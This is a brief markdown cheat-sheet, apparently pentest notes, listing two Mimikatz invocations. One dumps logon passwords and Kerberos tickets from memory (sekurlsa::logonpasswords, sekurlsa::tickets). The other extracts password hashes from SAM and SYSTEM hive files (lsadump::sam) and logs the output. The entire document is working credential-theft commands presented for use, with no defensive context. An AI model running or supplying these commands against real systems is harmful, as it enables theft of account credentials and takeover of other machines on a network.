# Mimikatz syntax

1. mimkatz 1 liner:
   - `Mimikatz.exe "sekurlsa::logonpasswords" "sekurlsa::tickets" exit`
  
2. mimikatz SAM and SYSTEM files:
   - `Mimikatz.exe "log mimikatz.log" "lsadump::sam /system:<system file> /sam:<sam file>" exit`
